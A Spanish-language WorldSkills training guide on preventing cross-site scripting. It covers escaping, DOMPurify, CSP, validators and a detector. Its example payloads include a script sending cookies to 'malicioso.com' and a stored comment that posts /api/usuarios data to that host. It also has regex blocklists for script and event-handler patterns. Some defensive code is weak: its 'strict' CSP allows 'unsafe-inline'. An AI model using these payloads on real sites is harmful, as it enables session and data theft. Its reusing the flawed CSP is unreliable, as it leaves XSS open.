# 🛡️ Guía de Prevención XSS (Cross-Site Scripting)

## 📋 Índice

1. [¿Qué es XSS?](#qué-es-xss)
2. [Tipos de Ataques XSS](#tipos-de-ataques-xss)
3. [Técnicas de Prevención](#técnicas-de-prevención)
4. [Sanitización de Datos](#sanitización-de-datos)
5. [Content Security Policy (CSP)](#content-security-policy-csp)
6. [Validación de Entrada](#validación-de-entrada)
7. [Codificación de Salida](#codificación-de-salida)
8. [Herramientas y Librerías](#herramientas-y-librerías)

---

## 🎯 ¿Qué es XSS?

**Cross-Site Scripting (XSS)** es una vulnerabilidad que permite a los atacantes inyectar código malicioso en páginas web vistas por otros usuarios. Esto puede llevar a:

- Robo de cookies y sesiones
- Redireccionamiento malicioso
- Modificación del contenido de la página
- Obtención de información sensible
- Ejecución de acciones en nombre del usuario

### **Ejemplo de Ataque XSS**

```html
<!-- Entrada maliciosa del usuario -->
<script>
  document.location = 'http://malicioso.com/robar?cookie=' + document.cookie;
</script>

<!-- Si no se sanitiza, se ejecuta en el navegador -->
<div>
  Comentario:
  <script>
    alert('XSS!');
  </script>
</div>
```

---

## 🎯 Tipos de Ataques XSS

### **1. XSS Reflejado (Reflected XSS)**

El código malicioso se incluye en la URL y se refleja inmediatamente en la página.

```javascript
// URL maliciosa
https://sitio.com/buscar?q=<script>alert('XSS')</script>

// Código vulnerable
const query = new URLSearchParams(window.location.search).get('q');
document.getElementById('resultado').innerHTML = `Búsqueda: ${query}`;
```

### **2. XSS Almacenado (Stored XSS)**

El código malicioso se guarda en la base de datos y se ejecuta cada vez que se carga.

```javascript
// Comentario malicioso guardado en BD
const comentario =
  '<script>fetch("/api/usuarios").then(r=>r.json()).then(d=>fetch("http://malicioso.com",{method:"POST",body:JSON.stringify(d)}))</script>';

// Código vulnerable al mostrar
document.getElementById('comentarios').innerHTML = comentario;
```

### **3. XSS Basado en DOM**

El código malicioso se ejecuta modificando el DOM del lado del cliente.

```javascript
// Código vulnerable
const hash = window.location.hash.substring(1);
document.getElementById('contenido').innerHTML = hash;

// URL maliciosa
https://sitio.com/#<script>alert('XSS')</script>
```

---

## 🛡️ Técnicas de Prevención

### **1. Escape de Caracteres HTML**

```javascript
// Función para escapar caracteres HTML
const escaparHTML = texto => {
  const div = document.createElement('div');
  div.textContent = texto;
  return div.innerHTML;
};

// Alternativa más completa
const escaparHTML = texto => {
  const mapa = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };

  return String(texto).replace(/[&<>"'\/]/g, caracter => mapa[caracter]);
};

// Uso seguro
const comentarioSeguro = escaparHTML(comentarioUsuario);
document.getElementById('comentario').innerHTML = comentarioSeguro;
```

### **2. Uso de textContent en lugar de innerHTML**

```javascript
// ❌ PELIGROSO - Puede ejecutar scripts
document.getElementById('elemento').innerHTML = datosUsuario;

// ✅ SEGURO - Solo texto, no ejecuta scripts
document.getElementById('elemento').textContent = datosUsuario;

// ✅ SEGURO - Crear elementos DOM
const p = document.createElement('p');
p.textContent = datosUsuario;
document.getElementById('contenedor').appendChild(p);
```

### **3. Validación Estricta de Entrada**

```javascript
class ValidadorXSS {
  constructor() {
    // Patrones peligrosos
    this.patronesPeligrosos = [
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<\s*\/?\s*[a-z]\w*\s*[^>]*>/gi,
    ];

    // Caracteres a escapar
    this.caracteresEscape = {
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '&': '&amp;',
      '/': '&#x2F;',
    };
  }

  contieneCodigo(texto) {
    return this.patronesPeligrosos.some(patron => patron.test(texto));
  }

  limpiar(texto) {
    if (typeof texto !== 'string') return '';

    // Escapar caracteres especiales
    let textoLimpio = texto;
    Object.keys(this.caracteresEscape).forEach(caracter => {
      const regex = new RegExp(caracter, 'g');
      textoLimpio = textoLimpio.replace(regex, this.caracteresEscape[caracter]);
    });

    return textoLimpio;
  }

  validar(texto) {
    return {
      esSeguro: !this.contieneCodigo(texto),
      textoLimpio: this.limpiar(texto),
      mensaje: this.contieneCodigo(texto)
        ? 'Contenido potencialmente peligroso detectado'
        : '',
    };
  }
}

// Uso
const validador = new ValidadorXSS();

// Validar entrada del usuario
const entradaUsuario = '<script>alert("XSS")</script>Hola mundo';
const resultado = validador.validar(entradaUsuario);

if (resultado.esSeguro) {
  document.getElementById('contenido').textContent = entradaUsuario;
} else {
  document.getElementById('contenido').textContent = resultado.textoLimpio;
  console.warn(resultado.mensaje);
}
```

---

## 🧼 Sanitización de Datos

### **1. Librería DOMPurify**

```javascript
// Instalación: npm install dompurify
import DOMPurify from 'dompurify';

// Sanitizar HTML
const htmlSucio = '<script>alert("XSS")</script><p>Contenido válido</p>';
const htmlLimpio = DOMPurify.sanitize(htmlSucio);

// Resultado: <p>Contenido válido</p>
document.getElementById('contenido').innerHTML = htmlLimpio;

// Configuración personalizada
const htmlLimpio = DOMPurify.sanitize(htmlSucio, {
  ALLOWED_TAGS: ['p', 'span', 'strong', 'em'],
  ALLOWED_ATTR: ['class', 'id'],
});
```

### **2. Sanitizador Personalizado**

```javascript
class SanitizadorHTML {
  constructor() {
    this.etiquetasPermitidas = [
      'p',
      'span',
      'strong',
      'em',
      'br',
      'ul',
      'ol',
      'li',
    ];
    this.atributosPermitidos = ['class', 'id'];
  }

  sanitizar(html) {
    // Crear un documento temporal
    const doc = new DOMParser().parseFromString(html, 'text/html');

    // Recorrer todos los elementos
    const elementos = doc.body.querySelectorAll('*');

    elementos.forEach(elemento => {
      // Verificar si la etiqueta está permitida
      if (!this.etiquetasPermitidas.includes(elemento.tagName.toLowerCase())) {
        elemento.remove();
        return;
      }

      // Limpiar atributos
      const atributos = Array.from(elemento.attributes);
      atributos.forEach(attr => {
        if (!this.atributosPermitidos.includes(attr.name)) {
          elemento.removeAttribute(attr.name);
        }
      });
    });

    return doc.body.innerHTML;
  }
}

// Uso
const sanitizador = new SanitizadorHTML();
const htmlSeguro = sanitizador.sanitizar(
  '<script>alert("XSS")</script><p class="texto">Hola</p>'
);
// Resultado: <p class="texto">Hola</p>
```

---

## 🔒 Content Security Policy (CSP)

### **1. Configuración Básica de CSP**

```html
<!-- En el HTML -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" />

<!-- O en el servidor (Express.js) -->
app.use((req, res, next) => { res.setHeader('Content-Security-Policy',
"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
next(); });
```

### **2. CSP Estricto**

```javascript
// Configuración CSP estricta
const cspConfig = {
  'default-src': ["'self'"],
  'script-src': ["'self'", "'unsafe-inline'"],
  'style-src': ["'self'", "'unsafe-inline'"],
  'img-src': ["'self'", 'data:', 'https:'],
  'font-src': ["'self'", 'https://fonts.googleapis.com'],
  'connect-src': ["'self'", 'https://api.ejemplo.com'],
  'frame-src': ["'none'"],
  'object-src': ["'none'"],
  'base-uri': ["'self'"],
  'form-action': ["'self'"],
};

// Generar header CSP
const generarCSP = config => {
  return Object.entries(config)
    .map(([directiva, fuentes]) => `${directiva} ${fuentes.join(' ')}`)
    .join('; ');
};

// Aplicar CSP
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', generarCSP(cspConfig));
  next();
});
```

### **3. CSP con Nonces**

```javascript
// Generar nonce único
const crypto = require('crypto');
const generarNonce = () => crypto.randomBytes(16).toString('base64');

// Middleware para CSP con nonce
app.use((req, res, next) => {
  const nonce = generarNonce();
  res.locals.nonce = nonce;

  const csp = `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'`;
  res.setHeader('Content-Security-Policy', csp);
  next();
});

// En el HTML
<script nonce="<%= nonce %>">
  // Código JavaScript seguro console.log('Script con nonce');
</script>;
```

---

## ✅ Validación de Entrada

### **1. Validador de Entrada Robusto**

```javascript
class ValidadorEntrada {
  constructor() {
    this.patronesProhibidos = [
      // Scripts
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      /javascript:/gi,
      /vbscript:/gi,
      /data:text\/html/gi,

      // Eventos
      /on\w+\s*=/gi,

      // Etiquetas peligrosas
      /<(iframe|embed|object|applet|meta|link|style|script)[^>]*>/gi,

      // Expresiones peligrosas
      /expression\s*\(/gi,
      /url\s*\(/gi,
      /@import/gi,
    ];

    this.caracteresProhibidos = [
      '\u0000', // Null byte
      '\u0001', // Start of heading
      '\u0002', // Start of text
      '\u0003', // End of text
      '\u0004', // End of transmission
      '\u0005', // Enquiry
      '\u0006', // Acknowledge
      '\u0007', // Bell
      '\u0008', // Backspace
      '\u000B', // Vertical tab
      '\u000C', // Form feed
      '\u000E', // Shift out
      '\u000F', // Shift in
      '\u007F', // Delete
    ];
  }

  validar(entrada) {
    if (typeof entrada !== 'string') {
      return {
        esValido: false,
        errores: ['La entrada debe ser una cadena de texto'],
      };
    }

    const errores = [];

    // Verificar patrones prohibidos
    this.patronesProhibidos.forEach((patron, index) => {
      if (patron.test(entrada)) {
        errores.push(`Patrón prohibido detectado (${index + 1})`);
      }
    });

    // Verificar caracteres prohibidos
    this.caracteresProhibidos.forEach(caracter => {
      if (entrada.includes(caracter)) {
        errores.push(`Carácter prohibido detectado: ${caracter.charCodeAt(0)}`);
      }
    });

    // Verificar longitud
    if (entrada.length > 10000) {
      errores.push('Entrada demasiado larga');
    }

    return {
      esValido: errores.length === 0,
      errores,
    };
  }

  limpiar(entrada) {
    if (typeof entrada !== 'string') return '';

    // Remover caracteres prohibidos
    let limpio = entrada;
    this.caracteresProhibidos.forEach(caracter => {
      limpio = limpio.replace(new RegExp(caracter, 'g'), '');
    });

    // Remover patrones peligrosos
    this.patronesProhibidos.forEach(patron => {
      limpio = limpio.replace(patron, '');
    });

    return limpio.trim();
  }
}

// Uso
const validador = new ValidadorEntrada();

// Validar entrada del usuario
const entrada = '<script>alert("XSS")</script>Texto normal';
const resultado = validador.validar(entrada);

if (!resultado.esValido) {
  console.error('Entrada inválida:', resultado.errores);
  const entradaLimpia = validador.limpiar(entrada);
  console.log('Entrada limpia:', entradaLimpia);
}
```

### **2. Validación de URLs**

```javascript
class ValidadorURL {
  constructor() {
    this.protocolosPermitidos = ['http:', 'https:', 'ftp:'];
    this.dominiosProhibidos = ['javascript:', 'data:', 'vbscript:'];
  }

  validar(url) {
    try {
      const urlObj = new URL(url);

      // Verificar protocolo
      if (!this.protocolosPermitidos.includes(urlObj.protocol)) {
        return {
          esValido: false,
          mensaje: 'Protocolo no permitido',
        };
      }

      // Verificar dominio
      if (
        this.dominiosProhibidos.some(dominio =>
          url.toLowerCase().includes(dominio)
        )
      ) {
        return {
          esValido: false,
          mensaje: 'Dominio prohibido',
        };
      }

      return {
        esValido: true,
        mensaje: 'URL válida',
      };
    } catch (error) {
      return {
        esValido: false,
        mensaje: 'Formato de URL inválido',
      };
    }
  }
}

// Uso
const validadorURL = new ValidadorURL();
const resultadoURL = validadorURL.validar('javascript:alert("XSS")');
console.log(resultadoURL); // { esValido: false, mensaje: 'Dominio prohibido' }
```

---

## 🔤 Codificación de Salida

### **1. Codificador de Contexto**

```javascript
class CodificadorContexto {
  // Codificación para contexto HTML
  static paraHTML(texto) {
    const mapa = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;',
    };

    return String(texto).replace(/[&<>"'\/]/g, char => mapa[char]);
  }

  // Codificación para atributos HTML
  static paraAtributo(texto) {
    return String(texto).replace(/[^a-zA-Z0-9\-._]/g, char => {
      const hex = char.charCodeAt(0).toString(16);
      return `&#x${hex};`;
    });
  }

  // Codificación para JavaScript
  static paraJavaScript(texto) {
    return String(texto).replace(/[^a-zA-Z0-9\s]/g, char => {
      const hex = char.charCodeAt(0).toString(16);
      return `\\u${hex.padStart(4, '0')}`;
    });
  }

  // Codificación para CSS
  static paraCSS(texto) {
    return String(texto).replace(/[^a-zA-Z0-9\-]/g, char => {
      const hex = char.charCodeAt(0).toString(16);
      return `\\${hex} `;
    });
  }

  // Codificación para URL
  static paraURL(texto) {
    return encodeURIComponent(String(texto));
  }
}

// Uso según contexto
const datosUsuario = '<script>alert("XSS")</script>';

// Para contenido HTML
document.getElementById('contenido').innerHTML =
  CodificadorContexto.paraHTML(datosUsuario);

// Para atributos HTML
const enlace = document.createElement('a');
enlace.href = CodificadorContexto.paraURL(datosUsuario);
enlace.title = CodificadorContexto.paraAtributo(datosUsuario);

// Para JavaScript
const script = `var dato = "${CodificadorContexto.paraJavaScript(
  datosUsuario
)}";`;
```

### **2. Sistema de Plantillas Seguro**

```javascript
class PlantillaSegura {
  constructor() {
    this.filtros = {
      html: CodificadorContexto.paraHTML,
      attr: CodificadorContexto.paraAtributo,
      js: CodificadorContexto.paraJavaScript,
      css: CodificadorContexto.paraCSS,
      url: CodificadorContexto.paraURL,
    };
  }

  renderizar(plantilla, datos) {
    return plantilla.replace(
      /\{\{\s*(\w+)(?:\s*\|\s*(\w+))?\s*\}\}/g,
      (match, variable, filtro) => {
        const valor = datos[variable] || '';

        if (filtro && this.filtros[filtro]) {
          return this.filtros[filtro](valor);
        }

        // Por defecto, aplicar filtro HTML
        return this.filtros.html(valor);
      }
    );
  }
}

// Uso
const plantilla = new PlantillaSegura();
const datos = {
  nombre: '<script>alert("XSS")</script>Juan',
  url: 'javascript:alert("XSS")',
  estilos: 'color: red; background: url(javascript:alert("XSS"))',
};

const html = plantilla.renderizar(
  `
  <div>
    <h1>Hola {{ nombre }}</h1>
    <a href="{{ url | url }}">Enlace</a>
    <div style="{{ estilos | css }}">Contenido</div>
  </div>
`,
  datos
);
```

---

## 🛠️ Herramientas y Librerías

### **1. DOMPurify**

```javascript
// Instalación
npm install dompurify

// Uso básico
import DOMPurify from 'dompurify';

const htmlLimpio = DOMPurify.sanitize(htmlSucio);
document.getElementById('contenido').innerHTML = htmlLimpio;

// Configuración personalizada
const config = {
  ALLOWED_TAGS: ['p', 'span', 'strong', 'em'],
  ALLOWED_ATTR: ['class', 'id'],
  ALLOW_DATA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false
};

const htmlSeguro = DOMPurify.sanitize(htmlSucio, config);
```

### **2. Helmet.js (Para Node.js)**

```javascript
// Instalación
npm install helmet

// Uso en Express.js
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"]
    }
  },
  crossOriginEmbedderPolicy: false
}));
```

### **3. Validator.js**

```javascript
// Instalación
npm install validator

// Uso
import validator from 'validator';

// Validar y sanitizar
const email = validator.isEmail('test@example.com');
const textoLimpio = validator.escape('<script>alert("XSS")</script>');
const urlValida = validator.isURL('https://example.com');
```

---

## 🔍 Herramientas de Detección

### **1. Detector de XSS**

```javascript
class DetectorXSS {
  constructor() {
    this.firmas = [
      /(<\s*script[^>]*>[\s\S]*?<\s*\/\s*script\s*>)/gi,
      /(javascript\s*:)/gi,
      /(on\w+\s*=)/gi,
      /(<\s*iframe[^>]*>[\s\S]*?<\s*\/\s*iframe\s*>)/gi,
      /(expression\s*\()/gi,
      /(vbscript\s*:)/gi,
      /(data\s*:\s*text\/html)/gi,
    ];
  }

  detectar(contenido) {
    const amenazas = [];

    this.firmas.forEach((firma, index) => {
      const coincidencias = contenido.match(firma);
      if (coincidencias) {
        amenazas.push({
          tipo: `XSS-${index + 1}`,
          coincidencias: coincidencias,
          gravedad: this.calcularGravedad(coincidencias),
        });
      }
    });

    return {
      esSeguro: amenazas.length === 0,
      amenazas,
      puntuacion: this.calcularPuntuacion(amenazas),
    };
  }

  calcularGravedad(coincidencias) {
    if (coincidencias.some(c => c.includes('script'))) return 'alta';
    if (coincidencias.some(c => c.includes('javascript:'))) return 'media';
    return 'baja';
  }

  calcularPuntuacion(amenazas) {
    const pesos = { alta: 10, media: 5, baja: 1 };
    return amenazas.reduce((total, amenaza) => {
      return total + pesos[amenaza.gravedad] * amenaza.coincidencias.length;
    }, 0);
  }
}

// Uso
const detector = new DetectorXSS();
const contenido = '<script>alert("XSS")</script>Texto normal';
const resultado = detector.detectar(contenido);

if (!resultado.esSeguro) {
  console.warn('Amenazas detectadas:', resultado.amenazas);
  console.log('Puntuación de riesgo:', resultado.puntuacion);
}
```

---

## 🎯 Casos de Uso Específicos

### **1. Comentarios de Usuario**

```javascript
class SistemaComentarios {
  constructor() {
    this.validador = new ValidadorEntrada();
    this.sanitizador = new SanitizadorHTML();
  }

  procesarComentario(comentario) {
    // 1. Validar entrada
    const validacion = this.validador.validar(comentario);
    if (!validacion.esValido) {
      throw new Error('Comentario inválido: ' + validacion.errores.join(', '));
    }

    // 2. Sanitizar HTML
    const comentarioLimpio = this.sanitizador.sanitizar(comentario);

    // 3. Escapar para mostrar
    const comentarioSeguro = DOMPurify.sanitize(comentarioLimpio);

    return comentarioSeguro;
  }

  mostrarComentario(id, comentario) {
    const elemento = document.getElementById(id);
    elemento.innerHTML = this.procesarComentario(comentario);
  }
}

// Uso
const sistema = new SistemaComentarios();
sistema.mostrarComentario(
  'comentario-1',
  '<script>alert("XSS")</script>¡Excelente artículo!'
);
```

### **2. Editor de Texto Rico**

```javascript
class EditorSeguro {
  constructor(contenedor) {
    this.contenedor = contenedor;
    this.configurarCSP();
    this.inicializar();
  }

  configurarCSP() {
    // Configurar CSP estricto para el editor
    const csp =
      "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'";
    document.querySelector(
      'meta[http-equiv="Content-Security-Policy"]'
    ).content = csp;
  }

  inicializar() {
    this.contenedor.addEventListener('input', e => {
      const contenido = e.target.innerHTML;
      const contenidoLimpio = this.sanitizarContenido(contenido);

      if (contenido !== contenidoLimpio) {
        e.target.innerHTML = contenidoLimpio;
        this.posicionarCursor(e.target);
      }
    });
  }

  sanitizarContenido(html) {
    return DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'ul', 'ol', 'li'],
      ALLOWED_ATTR: ['class'],
      ALLOW_DATA_ATTR: false,
    });
  }

  posicionarCursor(elemento) {
    const range = document.createRange();
    const selection = window.getSelection();
    range.selectNodeContents(elemento);
    range.collapse(false);
    selection.removeAllRanges();
    selection.addRange(range);
  }
}

// Uso
const editor = new EditorSeguro(document.getElementById('editor'));
```

---

## 📋 Checklist de Prevención XSS

### **✅ Validación de Entrada**

- [ ] Validar todos los datos de entrada
- [ ] Usar listas blancas en lugar de listas negras
- [ ] Verificar longitud de entrada
- [ ] Detectar patrones peligrosos
- [ ] Validar tipos de datos

### **✅ Sanitización**

- [ ] Usar DOMPurify o similar
- [ ] Configurar etiquetas permitidas
- [ ] Remover scripts y eventos
- [ ] Limpiar URLs peligrosas
- [ ] Validar archivos subidos

### **✅ Codificación de Salida**

- [ ] Escapar caracteres HTML
- [ ] Usar textContent en lugar de innerHTML
- [ ] Codificar según contexto
- [ ] Validar datos antes de mostrar
- [ ] Usar plantillas seguras

### **✅ Content Security Policy**

- [ ] Configurar CSP estricto
- [ ] Usar nonces para scripts
- [ ] Prohibir 'unsafe-inline' y 'unsafe-eval'
- [ ] Configurar directives apropiadas
- [ ] Monitorear violaciones CSP

### **✅ Herramientas**

- [ ] Usar librerías de sanitización
- [ ] Implementar detectores XSS
- [ ] Configurar headers de seguridad
- [ ] Realizar pruebas de penetración
- [ ] Monitorear logs de seguridad

---

## 🎓 Ejercicios Prácticos

### **Ejercicio 1: Detector de XSS**

Crear un detector que identifique diferentes tipos de ataques XSS en texto de entrada.

### **Ejercicio 2: Sanitizador de Comentarios**

Implementar un sistema que permita comentarios con formato básico pero prevenga XSS.

### **Ejercicio 3: Editor de Texto Seguro**

Crear un editor WYSIWYG que permita formato pero sea completamente seguro contra XSS.

### **Ejercicio 4: Sistema de CSP**

Implementar un sistema que genere automáticamente políticas CSP según el contenido.

---

## 🔗 Referencias

- **OWASP XSS Prevention Cheat Sheet**
- **MDN Content Security Policy**
- **DOMPurify Documentation**
- **Google Web Security Guidelines**
- **Mozilla Security Guidelines**

---

_Este documento es parte del programa de entrenamiento WorldSkills - Día 4: Validaciones y Seguridad Frontend_
